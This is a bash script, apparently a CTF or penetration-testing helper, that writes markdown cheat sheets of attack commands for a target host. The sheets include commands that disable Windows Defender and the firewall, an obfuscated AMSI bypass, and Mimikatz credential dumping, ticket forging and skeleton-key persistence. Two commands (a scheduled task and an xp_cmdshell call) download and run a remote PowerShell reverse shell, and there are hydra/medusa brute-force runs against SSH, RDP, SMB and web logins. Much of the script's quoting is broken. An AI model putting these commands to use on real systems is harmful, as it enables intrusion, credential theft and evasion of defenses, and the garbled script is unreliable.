#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

unset GREP_OPTIONS

inf=
loc=
box_ip=
box_host=

usage() {
	echo -e "
    ${NC}usage: $0 -d DEVICE -i IP -o FULL_OUTPUT_DIR

    or

    ${NC}usage: $0 pwnbox -d DEVICE -n HOST -o FULL_OUTPUT_DIR

    
    OPTIONS:

    -h 			 	        show this menu

    -d DEVICE  		        network interface of target network
	
    -n NAME   		        (optional) hostname
	
    -i IP     		        ip of the target box

    -o FULL_OUTPUT_DIR 		full output directory path
	
    EXAMPLES:

    $0 -d eth0 -i 10.10.10.1 -o /tmp/pwn_box2pwn/

    $0 -d eth0 -n name.tld -o /tmp/pwn_box2pwn/
    \"
}

while getopts “:d:i:n:o:” OPTION
do
  case $OPTION in
    h)
      usage
      exit 1
      ;;
    d)
      inf=$OPTARG
      ;;
    i)
      box_ip=$OPTARG
      ;;
	n)
	  box_host=$OPTARG
	  ;;
    o)
      loc=$OPTARG
      ;;
    ?)
      usage
      exit
      ;;
    :)
      echo \"Option -$OPTARG requires an argument.\"
      exit 1
      ;;
  esac
done

troubleshooting() {
  if (( $EUID != 0 )); then
		printf \"${RED}[x] sudo privileges not detected!!!\n\"
		exit 1
	fi
  if [ -n \"$inf" ]; then
    printf \"${GREEN}[+]${NC} Using interface: $inf \n"
  else
    printf \"${RED}[!]${NC} Interface not set, exiting... \n"
    exit 1
  fi

  if [ -z $loc ]; then
      printf \"${RED}[!]${NC} No output directory specified \n"
      exit 1
  fi

  if [ -z $box_ip ] && [ -z $box_host ]; then
      printf \"${RED}[!]${NC} Please specify either a box ip or hostname \n"
      exit 1
  fi

  if [ ! -z \"$box_ip" -a \"$box_ip"!=" \" ] && [ ! -z \"$box_host" -a \"$box_host"!=" \" ] ; then
    printf \"${GREEN}[+]${NC} Requirements met for /etc/hosts entry \n"
    echo \"${box_ip}       ${box_host}" >> /etc/hosts
  else
    printf \"${YELLOW}[-]${NC} Skipping /etc/hosts entry \n"
  fi

}
troubleshooting

printf \"${YELLOW}[-]${NC} Loading Functions... \n"

seclist_dir=$(find / -type d -name \"SecLists" 2>/dev/null | tr \"\n" \"," | cut -f1 -d \",")
if [ -z \"$seclist_dir" ]; then
  printf \"${YELLOW}[-]${NC} SecLists directory not found... \n"
  printf \"${YELLOW}[-]${NC} Attempting to download SecLists... \n"
  git clone https://github.com/danielmiessler/SecLists.git
  seclist_dir=$(find / -type d -name \"SecLists" 2>/dev/null | tr \"\n" \"," | cut -f1 -d \",")
fi

imp_dirs=$(find / -type d -name 'impacket' -print 2>/dev/null | grep 'impacket')
if [ -z \"$imp_dirs" ]; then
  printf \"${YELLOW}[-]${NC} Impacket directory not found... \n"
  printf \"${YELLOW}[-]${NC} Attempting to download Impacket... \n"
  git clone https://github.com/SecureAuthCorp/impacket.git
  imp_dirs=$(find / -type d -name 'impacket' -print 2>/dev/null | grep 'impacket')
fi
imp_dir=$(echo $imp_dirs | tr '\n' ' '| cut -f1 -d ' ')
imp_dir="${imp_dir}/examples"


domain_list="${seclist_dir}/DNS/subdomains-top1000000.txt"
directory_list1="/usr/share/wordlists/dirb/big.txt"
directory_list2="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
user_list="${seclist_dir}/Usernames/xato-net-10-million-usernames.txt"
pass_list="${seclist_dir}/Passwords/xato-net-10-million-passwords-1000000.txt"

gen_basic_commands() {
    echo -e "

### Setup ENV

Run in every new terminal opened:

\`\`\`bash
. ${loc}/box_vars.sh
\`\`\`

### Reporting

\`\`\`bash
./report_gen.sh
\`\`\`" > ${loc}/cmds2run/1-start.md

    echo -e "

# Active Directory

> Metasploit 4 Exploitation, Empire 4 Post-Exploitation

### All Domain and Forest Trusts

\`\`\`
Get-NetForestDomain -Verbose
Get-NetDomainTrust
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
Get-NetForestDomain -Forest ab.local -Verbose | Get-NetDomainTrust
Get-NetForest
\`\`\`

### Basic Enum (Powershell)

\`\`\`
Get-NetUser | select Name
Get-NetGroup | select Name
Get-NetComputer | select Name
Get-NetGroupMember \"Domain Admins\"
Invoke-ShareFinder
Get-ObjectAcl -SamAccountName \"Domain Admins\"
Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs
Get-NetOU select | name
Get-NetDomainTrust
Get-NetForestDomain
Get-NetForestTrust
Get-NetComputer -Domain domain_showed.local | select name
Find-LocalAdminAccess
Invoke-UserHunter
\`\`\`

### Defender

\`\`\`
Set-MpPreference -DisableRealtimeMonitoring \$true
\`\`\`

or 

\`\`\`
Set-MpPreference -DisableIOAVProtection \$true
\`\`\`

or

\`\`\`
sc stop WinDefend
\`\`\`

\`\`\`
New-ItemProperty -Path \"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
\`\`\`

or

\`\`\`
Set-MpPreference -DisableIntrusionPreventionSystem \$true -DisableIOAVProtection \$true -DisableRealtimeMonitoring \$true -DisableScriptScanning \$true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend

can add

-DisableRea \$true
\`\`\`

### Firewall

\`\`\`
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
\`\`\`

### Applocker

\`\`\`
Get-AppLockerPolicy -Xml -Local
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleColletions
\`\`\`

### PSSession

**make a new session**

\`\`\`
\$sess = New-PSSession -ComputerName xxx.local
\`\`\`

**run commands**

\`\`\`
Invoke-Command -ScriptBlock {dir} -Session \$sess
\`\`\`

**run scripts**

\`\`\`
Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring \$true} -Session \$sess
Invoke-Command -FilePath \"C:\Invoke-Mimikatz.ps1\" -session \$sess
\`\`\`

**join session**

\`\`\`
Enter-PSSession \$sess
\`\`\`


**copy files to session**
\`\`\`
Copy-Item -Path C:\flag.txt -Destination 'C:\Users\Public\Music\flag.txt' -FromSession \$sess
\`\`\`

### AMSI

\`\`\`
powershell -ep bypass
\`\`\`

or

\`\`\`
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),( \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"( ${n`ULl},${t`RuE} )
\`\`\`

### Powershell Language Mode

\`\`\`
$ExecutionContext.SessionState.LanguageMode
powershell -version 2
$ExecutionContext.SessionState.LanguageMode = \"FullLanguage\"
\`\`\`

### Mimikatz

**Dump Hashes**

\`\`\`
./mimikatz.exe lsadump::lsa /patch
\`\`\`

\`\`\`
lsadump::sam
sekurlsa::logonpasswords
\`\`\`

or 

\`\`\`
Invoke-Mimikatz -Command \'\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"\' 
Invoke-Mimikatz -Command \'\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::lsa /patch\" \"exit\"\' 
Invoke-Mimikatz -Command ‘\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::lsa /patch\" \"lsadump::sam\"
\`\`\`

**Pass the Hash**

\`\`\`
sekurlsa::pth /user:xxxx /domain:xxxx /ntlm:xxxxx /run:powershell.exe
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND
\`\`\`

or 

\`\`\`
Invoke-Mimikatz -Command \'\"sekurlsa::pth /user:xxxx /domain:xxxx /ntlm:xxxxxxx /run:powershell.exe\"\'
\`\`\`

**Pass the Ticket**

\`\`\`
Get-NetComputer -UnConstrained | select Name
Invoke-Command -ScriptBlock {Invoke-Mimikatz -Command '\"privilege::debug\" \"token::elevate\" \"sekurlsa::tickets /export\"'} -Session \$sess
Invoke-Command -ScriptBlock{Invoke-Mimikatz -Command '\"kerberos:: ptt [...]\"'} -Session \$sess
Invoke-Command -Scriptblock{ls \\maquina.local\C$} -session \$sess
\`\`\`

**Privilege Across Trusts**

\`\`\`
Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:ab.cd.local /sid:<SID of ab.cd.local> /krbtgt:hash do krbtgt /sids:<SID of cd.local> /ptt\"'
\`\`\`

**DC Sync**

\`\`\`
Invoke-Mimikatz -Command \"privilege::debug\" \"token::elevate\" \"lsadump::dcsync /domain:ab.cd.local /user:Administrator\" \"exit\"
\`\`\`

**Skeleton Key**

 - This commands on the DC box, after owned it

\`\`\`
./mimkatz.exe
privilege::debug
token::elevate
misc::skeleton
\`\`\`

**Kerberoast**

\`\`\`
Get-NetUser -SPN
Request-SPN Ticket SPN/ab.cd.local
Invoke-Mimikatz -Command '\"kerberos::list /export\"'
\`\`\`

then

\`\`\`
kirbi2john.py
\`\`\`

**Golden Ticket**

\`\`\`
Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:ab.cd.local /sid:<SID of ab.cd.local> /krbtgt:xxxxxxx /sids:<SID of cd.local> /ptt\"'
\`\`\`

then

\`\`\`
./mimikatz.exe
kerberos::golden /domain:xxx.local /sid:S-1-5-21-3965405831... /rc4:c6d349.... /user:newAdmin /id:500 /ptt
\`\`\`

**Silver Ticker**

 - RPCSS

\`\`\`
Invoke-Mimikatz -Command '\"kerberos::golden /domain:ab.cd.local /sid:S-1-5-21- /target:DC.ac.cd.local /service:RPCSS /rc4:418ea3d41xxx /user:Administrator /ptt\"'
klist
gwmi -Class win32_operatingsystem -ComputerName DC.ac.cd.local
\`\`\`

 - HOST

\`\`\`
Invoke-Mimikatz -Command '\"kerberos::golden /domain:ab.cd.local /sid:S-1-5-21- /target:DC.ac.cd.local /service:RPCSS /rc4:418ea3d41xxx /user:Administrator /ptt\"'
schtasks /S DC.ac.cd.local
schtasks /create /S DC.ac.cd.local /SC Weekly /RU \"NT Authority\SYSTEM\" /TN \"shell\" /TR \"powershell.exe -c 'iex(new-object net.webclient).downloadstring(''http://..../Invoke-PowerShellTCP.ps1'')'\"
schtasks /Run /S DC.ac.cd.local /TN \"shell\"
\`\`\`

This can be done with any service, HOST, LDAP, CIFS, HTTP…

### PowerView Enumeration

\`\`\`
Get-NetUser
Get-NetGroup | select Name
Get-NetComputer | select Name
Get-NetGroupMember \"Domain Admins\"
Get-NetGroup \"Enterprise Admins\" -Domain domain.com

Invoke-ShareFinder
\`\`\`

### ACL Enumeration

\`\`\`
Get-ObjectAcl -SamAccountName \"Domain Admins\" -Verbose
Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match \"xxxx\"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match \"RPDUsers\"}
Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
Invoke-ACLScanner | Where-Object {$_.IdentityReferenceName –eq 'MAQUINA_QUE_QUERO_VER$'}
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
\`\`\`

### Misc Enum

**OUs Enumeration**

\`\`\`
Get-NetOU | select name
\`\`\`

**GPO Enumeration**

\`\`\`
(Get-NetOU StudentMachines).gplink
Get-NetGPO -ADSpath 'LDAP://cn={B822494A-DD6A-4E96-A2BB-944E397208A1},cn=policies,cn=system,DC=xxxxx,DC=xxxx,DC=local'
\`\`\`

### User Hunting Enum

\`\`\`
Find-LocalAdminAccess -Verbose
Invoke-UserHunter -Verbose
\`\`\`

### SID Enum

\`\`\`
ab.cd.local - Get-DomainSID
cd.local - Get-DomainSID -Domain cd.local
\`\`\`

### Bloodhound

\`\`\`bash
docker run -it -p 7474:7474 -e DISPLAY=unix\$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --device=/dev/dri:/dev/dri -v \$(pwd)/data:/data --name bloodhound belane/bloodhound
\`\`\`

### Data Ingestion

**bloodhound-python**

\`\`\`bash
user=DOMAIN_USERNAME
pass=DOMAIN_PASSWORD
domain=DOMAIN.TLD
dc_name=HOSTNAME.DOMAIN.TLD
dc_address=DOMAIN_CONTROLLER_IP
bloodhound-python --zip -v -u \$user -p \$pass -c dconly -d \$domain -ns \$dc_address -dc \$dc_name
\`\`\`\

**sharphound**

\`\`\`bash
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod all -ZipFileName bleed_out
\`\`\`

**azure-hound**

> https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html

" > ${loc}/cmds2run/2-AD.md

    echo -e "

### DCSYNC

> https://0x4rt3mis.github.io/posts/Active-Directory-Persistence-Domain/

\`\`\`
tgt::ask /user:dbservice /domain:DOMÍNIO /ntlm:HASH_DO_DBSERVICE /ticket:dbservice.kirbi
tgs::s4u /tgt:TGT_dbservice@XXXX_krbtgt~XXXX@XXXX.kirbi /user:Administrator@XXXX /service:time/XXXXX.local|ldap/XXXX.local
Invoke-Mimikatz -Command \'\"kerberos::ptt TGS_Administrator@XXXX@XXXX_ldap~XXXX@XXXX_ALT.kirbi\"\'
Invoke-Mimikatz -Command \'\"lsadump::dcsync /user:usfun\Administrator\"\'
Invoke-Mimikatz -Command \'\"sekurlsa::pth /user:administrator /domain:XXXXXX /ntlm:hash_administrator_dc /run:powershell.exe\"\'
Enter-PSSession -ComputerName dc
privilege::debug
misc::skeleton
\`\`\`

### PSSession

\`\`\`
\$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
foreach (\$computer in \$computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName \$computer ).Name }
Invoke-Command –Scriptblock {ipconfig} -ComputerName máquina_com_acesso
\$sess = New-PSSession -ComputerName máquina_com_acesso
Enter-PSSession -Session \$sess
Invoke-Command -FilePath \"C:\\Users\\script.ps1\" -session \$sess
\`\`\`

" > ${loc}/cmds2run/2.2-AD_persis.md
    
    echo -e "

### Active Monitoring

\`\`\`bash
wireshark -i $inf -w ${loc}/networking/ws1.pcap
\`\`\`

\`\`\`bash
sudo tcpdump -i $inf -w ${loc}/networking/td1.pcap
\`\`\`

\`\`\`bash
sudo tcpflow -i $inf -o ${loc}/networking/tcpflow_dump/ -a
\`\`\`

### PCAP Analysis

\`\`\`bash
wireshark -r PCAPFILE
\`\`\`

\`\`\`bash
tcpdump -r PCAPFILE
\`\`\`
" > ${loc}/cmds2run/3-network_forensics.md

echo -e "

### Stegonography

\`\`\`bash
docker run -v \$(pwd)/pictures_2_crack/:/pictures_2_crack -it paradoxis/stegcracker
\`\`\`

\`\`\`bash
docker run --rm -it -v \$(pwd):/steg rickdejager/stegseek
\`\`\`

\`\`\`bash
docker run -it --rm bannsec/stegoveritas
\`\`\`

\`\`\`bash
docker run -it --rm -v \$(pwd)/files_4_inspection:/files_4_inspection dominicbreuker/stego-toolkit /bin/bash
\`\`\`" > ${loc}/cmds2run/4-stegonagraphy.md

}

##############################
# 		     IP		         #
##############################

gen_ip_commands() {
  ipurl=http://${box_ip}
	ipurl_https=https://${box_ip}


	echo -e "
## Port Scans

\`\`\`bash
docker run rustscan/rustscan -a $box_ip
\`\`\`

\`\`\`bash
sudo masscan -p0-65535 $box_ip --max-rate 1000 -oG ${loc}/1-recon/masscan-tcp.md -e $inf
\`\`\`

\`\`\`bash
sudo masscan -pU:0-65535 $box_ip --max-rate 1000 -oG ${loc}/1-recon/masscan-udp.md -e $inf
\`\`\`

\`\`\`bash
sudo python3 /opt/AutoRecon/autorecon.py $box_ip -p ${all_ports} -o ${loc}/6-misc-tools/autorecon/
\`\`\`

\`\`\`bash
nmap -vvv -Pn -p ${all_ports} -sC -sV -oN ${loc}/1-recon/nmap/all_tcp.md $box_ip
\`\`\`

\`\`\`bash
sudo nmap -vvv -Pn -sU -p ${all_ports} -sC -sV -oN ${loc}/1-recon/nmap/all_udp.md $box_ip
\`\`\`

\`\`\`bash
nmap -vvv -Pn -p ${all_ports} --script vuln -oN ${loc}/1-recon/nmap/all_vuln.md $box_ip
\`\`\`

\`\`\`bash
nmap -Pn -vvv -p- -A -oN ${loc}/1-recon/nmap/tcp_agress.md $box_ip
\`\`\`

\`\`\`bash
sudo nmap -Pn -vvv -sU -p- -A -oN ${loc}/1-recon/nmap/udp_agress.md $box_ip
\`\`\`" > ${loc}/cmds2run/ip-specific/1-port_scans.md

	echo -e "

### DNS Recon

\`\`\`bash
nslookup $box_ip | tee ${loc}/2-enum/dns/nslookup.md
\`\`\`" > ${loc}/cmds2run/ip-specific/2-dns.md

	echo -e "

### General Enum - ftp & smb

\`\`\`bash
smbmap -H $box_ip | tee ${loc}/2-enum/smb/smbmap1.md
\`\`\`

\`\`\`bash
smbmap -H $box_ip -u anonymous | tee ${loc}/2-enum/smb/smbmap2.md
\`\`\`

\`\`\`bash
smbmap -H $box_ip -u anonymous -p \'\' | tee ${loc}/2-enum/smb/smbmap3.md
\`\`\`

\`\`\`bash
smbmap -H $box_ip -u anonymous -d INSERT_DOMAIN | tee ${loc}/2-enum/smb/smbmap2.md
\`\`\`

\`\`\`bash
smbmap -H $box_ip -u anonymous -d localhost | tee ${loc}/2-enum/smb/smbmap2.md
\`\`\`

\`\`\`bash
smbclient \\\\\\\\${box_ip}\\\\\\\\SHARENAME
\`\`\`

\`\`\`bash
smbclient -m SMB2 -N -L //${box_ip}/
\`\`\`

\`\`\`bash
enum4linux -a $box_ip | tee ${loc}/2-enum/2-enum4linux.md
\`\`\`" > ${loc}/cmds2run/ip-specific/3-general_enum.md

	echo -e "
### Basic Web Enum

\`\`\`bash
whatweb ${box_ip}:\${web1} | tee ${loc}/2-enum/web/whatweb_ip.md
\`\`\`

\`\`\`bash
nikto -h $box_ip -port \$web1 -o ${loc}/2-enum/web/nikto_ip.txt  
\`\`\`

\`\`\`bash
for i in {5..10}; do
	touch ${loc}/6-misc-tools/cewl/cewl_ip_\${i}.md
	cewl -d 10 -m \$i -w ${loc}/6-misc-tools/cewl/cewl_ip_\${i}.md ${ipurl}:\${web1} 
done

\`\`\`### WP-scan

\`\`\`bash
docker run -it --rm wpscanteam/wpscan ${wpapi2}--url ${ipurl}:\${web1} -f cli-no-color -o ${loc}/2-enum/web/wpscan_ip.md  --enumerate u,m,ap,at,tt,cb,dbe --plugins-detection mixed
\`\`\`

\`\`\`bash
docker run -it --rm wpscanteam/wpscan ${wpapi2}--url ${ipurl}:\${web1} -U enum/box_users.md -P /usr/share/wordlists/rockyou.txt -o enum/web/wpscan_ip_brute.md

\`\`\`### auto-tools

\`\`\`bash
export tpls=(\"ns\" \"cves\" \"cnvd\" \"takeovers\" \"vulnerabilities\" \"file\" \"fuzzing\" \"miscellaneous\" \"exposed-panels\")
for tpl in \${tpls[@]}; do 
	touch ${loc}/6-misc-tools/autotools/\${tpl}.md
	docker run projectdiscovery/nuclei -v -t \$tpl -u ${ipurl}:\${web1} -o ${loc}/6-misc-tools/nuclei/\${tpl}.md
done
\`\`\`

\`\`\`bash
python3 /opt/Photon/photon.py -u ${ipurl}:\${web1} -l 10 --dns --clone --headers --keys -v -o ${loc}/6-misc-tools/photon_ip/

\`\`\`" > ${loc}/cmds2run/ip-specific/4-basic_web.md

	echo -e "

### Directory Brute Forcing

**HTTP**

\`\`\`bash
dirb ${ipurl}:\${web1} -o ${loc}/2-enum/web/dirb_ip.md
\`\`\`

\`\`\`bash
dirb ${ipurl}:\${web1} -X .txt,.sh,.php,.pl,.py,.xml,.bak -o ${loc}/2-enum/web/dirb_ip_ext.md

\`\`\`

\`\`\`bash
gobuster dir -u ${ipurl}:\${web1} -w ${directory_list1} -o ${loc}/2-enum/web/gob_dir.md
\`\`\`

\`\`\`bash
gobuster dir -u ${ipurl}:\${web1} -w ${directory_list1} -x log,txt,php,xml,csv,dat,pdf,doc,docx,ppt,pptx,xlr,xls,xlsx,db,dbf,mdb,pdb,sql,apk,jar,exe,7z,rar,tar.gz,zip,c,cpp,cs,h,sh,vb,vbs,pl,lua,java,py,bak,tmp -o ${loc}/2-enum/web/gob_files.md
\`\`\`

\`\`\`bash
gobuster dir -u ${ipurl}:\${web1} -w ${directory_list1} -x log,txt,pdf,xml,csv,bak,php,pl -o ${loc}/2-enum/web/gob_files_priority.md

\`\`\`**HTTPS**

\`\`\`bash
gobuster dir -k -u ${ipurl}:\${web2} -w ${directory_list2} -o ${loc}/2-enum/web/gob_dir_https.md
\`\`\`

\`\`\`bash
gobuster dir -k -u ${ipurl}:\${web2} -w ${directory_list2} -x log,txt,php,xml,csv,dat,pdf,doc,docx,ppt,pptx,xlr,xls,xlsx,db,dbf,mdb,pdb,sql,apk,jar,exe,7z,rar,tar.gz,zip,c,cpp,cs,h,sh,vb,vbs,pl,lua,java,py,bak,tmp -o ${loc}/2-enum/web/gob_files_https.md
\`\`\`

\`\`\`bash
gobuster dir -k -u ${ipurl}:\${web2} -w ${directory_list2} -x log,txt,pdf,xml,csv,bak,php,pl -o ${loc}/2-enum/web/gob_files_priority_https.md
\`\`\`

### HTTP Form Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/http/hydra_http.md {http_scheme}-get ${box_ip}/path/to/auth/area
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/http/medusa_http.md -h ${box_ip} -m DIR:/path/to/auth/area
\`\`\`

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/http/hydra_http_host.md http-post-form ${box_ip} \"/path/to/form:login_method:invalid-login-prompt\"
\`\`\`

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/http/hydra_http_host.md https-post-form ${box_ip} \"/path/to/form:login_method:invalid-login-prompt\"
\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/http/medusa_http_host.md -h ${box_ip} -m FORM:/path/to/login.php -m FORM-DATA:\"post?username=&password=\" -m DENY-SIGNAL:\"invalid login message\"

\`\`\`

### FTP Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/ftp/hydra_ftp.md ftp://${box_ip}
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/ftp/medusa_ftp.md -M ftp -h ${box_ip}

\`\`\`### SMB Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/smb/hydra_smb.md smb://${box_ip}
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/smb/medusa_smb.md -M smb -h ${box_ip}

\`\`\`

### SSH Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/ssh/hydra_ssh.md ssh://${box_ip}
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/ssh/medusa_ssh.md -M ssh -h ${box_ip}

\`\`\`

### RDP Brute Forcing

\`\`\`bash
hydra -L ${user_list} -P ${pass_list} -e nsr -o ${loc}/2-enum/rdp/hydra_rdp.md rdp://${box_ip}
\`\`\`

\`\`\`bash
medusa -U ${user_list} -P ${pass_list} -e ns -O ${loc}/2-enum/rdp/medusa_rdp.md -M rdp -h ${box_ip}

\`\`\`" > ${loc}/cmds2run/ip-specific/5-brute_forcing.md

	echo -e "

### SNMP

\`\`\`bash
snmp-check ${box_ip}
\`\`\`

### Crackmapexec

\`\`\`bash
docker run -it --entrypoint=/bin/sh --name crackmapexec -v ~/.cme:/root/.cme byt3bl33d3r/crackmapexec
\`\`\`

### PWNCat
\`\`\`bash
docker run -v \"./\":/work -t pwncat $box_ip LPORT
\`\`\`

### EvilWinRM

\`\`\`bash
export scripts_dir='/opt/server/ps_scripts/'; export exe_dir='/opt/server/exe/'; docker run --rm -ti --name evil-winrm -v \${scripts_dir}:/ps1_scripts -v \${exe_dir}:/exe_files -v \${pwd}:/data oscarakaelvis/evil-winrm
\`\`\`" > ${loc}/cmds2run/ip-specific/6-other_services.md

	echo -e "

### SMB server

\`\`\`bash
sudo python3 ${imp_dir}/smbserver.py -smb2support -username <SHARE_USER> -password <SHARE_PASS> -ip $attack_ip <SHARE_NAME> <SHARE_PATH>
\`\`\`

" > ${loc}/cmds2run/ip-specific/9-impacket.md

	echo -e "

### Active Monitoring

\`\`\`bash
wireshark -i $inf -w ${loc}/networking/ws1.pcap
\`\`\`

\`\`\`bash
sudo tcpdump -i $inf -w ${loc}/networking/td1.pcap
\`\`\`

\`\`\`bash
sudo tcpflow -i $inf -o ${loc}/networking/tcpflow_dump/ -a
\`\`\`

### PCAP Analysis

\`\`\`bash
wireshark -r PCAPFILE
\`\`\`bash
tcpdump -r PCAPFILE
\`\`\`
" > ${loc}/cmds2run/ip-specific/10-networking.md

echo -e "

### MSSQL Client

\`\`\`bash
${imp_dir}/mssqlclient.py USER@${box_ip}
${imp_dir}/mssqlclient.py USER@${box_ip} -windows-auth
\`\`\`

### MSSQL Enum

> https://0x4rt3mis.github.io/posts/Active-Directory-MSSQL-Server/

\`\`\`
Get-SQLInstanceDomain
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10
Get-SQLServerLinkCrawl -Instance ACCESIBLE_ONE
Get-SQLServerLinkCrawl -Instance ACCESIBLE_ONE -Query \"exec master..xp_cmdshell \'whoami\'\" | ft
powercat -l -v -p 443 -t 1000
Get-SQLServerLinkCrawl -Instance ACCESIBLE_ONE -Query \"exec master..xp_cmdshell \'powershell iex (New-Object Net.WebClient).DownloadString(\'\'http://x.x.x.x/Invoke-PowerShellTCP.ps1\'\')\'\" | ft
\`\`\`

### Heidi SQL

> https://0x4rt3mis.github.io/posts/Active-Directory-MSSQL-HeidSQL/

" > ${loc}/cmds2run/ip-specific/11-sql.md
}

##############################
# 		      Host 		         #

##############################

gen_host_commands() {
  hosturl_https=https://${box_host}
  hosturl=http://${box_host}

echo -e "

\`\`\`bash
docker run rustscan/rustscan -a ${box_host}
\`\`\`

\`\`\`bash
sudo masscan -p0-65535 ${box_host} --max-rate 1000 -oG ${loc}/1-recon/masscan-tcp.md -e $inf
\`\`\`

\`\`\`bash
sudo masscan -pU:0-65535 ${box_host} --max-rate 1000 -oG ${loc}/1-recon/masscan-udp.md -e $inf
\`\`\`

\`\`\`bash
sudo python3 /opt/AutoRecon/autorecon.py ${box_host} -p ${all_ports} -o ${loc}/6-misc-tools/autorecon/
\`\`\`

\`\`\`bash
nmap -vvv -Pn -p ${all_ports} -sC -sV -oN ${loc}/1-recon/nmap/all_tcp.md ${box_host}
\`\`\`

\`\`\`bash
sudo nmap -vvv -Pn -sU -p ${all_ports} -sC -sV -oN ${loc}/1-recon/nmap/all_udp.md ${box_host}
\`\`\`

\`\`\`bash
nmap -vvv -Pn -p ${all_ports} --script vuln -oN ${loc}/1-recon/nmap/all_vuln.md ${box_host}
\`\`\`

\`\`\`bash
nmap -Pn -vvv -p- -A -oN ${loc}/1-recon/nmap/tcp_agress.md ${box_host}
\`\`\`

\`\`\`bash
sudo nmap -Pn -vvv -sU -p- -A -oN ${loc}/1-recon/nmap/udp_agress.md ${box_host}
\`\`\`" > ${loc}/cmds2run/host-specific/1-port_scans.md

echo -e "

### DNS Recon

\`\`\`bash
host -l ${box_host} $box_ip | tee ${loc}/2-enum/dns/host.md
\`\`\`

\`\`\`bash
dnsrecon -a -d ${box_host} -t axfr | tee ${loc}/2-enum/dns/dnsrecon.md
\`\`\`

\`\`\`bash
dnsrecon -a -d DOMAIN -t axfr | tee ${loc}/2-enum/dns/dnsrecon.md
\`\`\`

\`\`\`bash
dig axfr ${box_host} @${box_ip} | tee ${loc}/2-enum/dns/dig.md
\`\`\`

### Domain Enumeration

\`\`\`bash
dnsenum ${box_host} | tee ${loc}/2-enum/dns/dnsenum.md
\`\`\`" > ${loc}/cmds2run/host-specific/2-dns.md

	echo -e "

### General Enum - ftp & smb


\`\`\`bash
enum4linux -a $box_ | tee ${loc}/2-enum/2-enum4linux.md
\`\`\`" > ${loc}/cmds2run/host-specific/3-general_enum.md

	echo -e "

### Basic Web Enum

\`\`\`bash
whatweb ${box_host}:\${web1} | tee ${loc}/2-enum/web/whatweb_host.md
\`\`\`

\`\`\`bash
for i in {5..10}; do
	touch ${loc}/6-misc-tools/cewl/cewl_words_host_\${i}.md
	cewl -d 10 -m \$i -w ${loc}/6-misc-tools/cewl/cewl_words_host_\${i}.md ${hosturl}:\${web1} 
done

\`\`\`

### WP-scan

\`\`\`bash
docker run -it --rm wpscanteam/wpscan ${wpapi2}--url ${hosturl}:\${web1} -f cli-no-color -o ${loc}/2-enum/web/wpscan_host.md  --enumerate u,m,ap,at,tt,cb,dbe --plugins-detection mixed
\`\`\`

\`\`\`bash
docker run -it --rm wpscanteam/wpscan ${wpapi2}--url ${hosturl}:\${web1} -U enum/box_users.md -P /usr/share/wordlists/rockyou.txt -o enum/web/wpscan_host_brute.md

\`\`\`

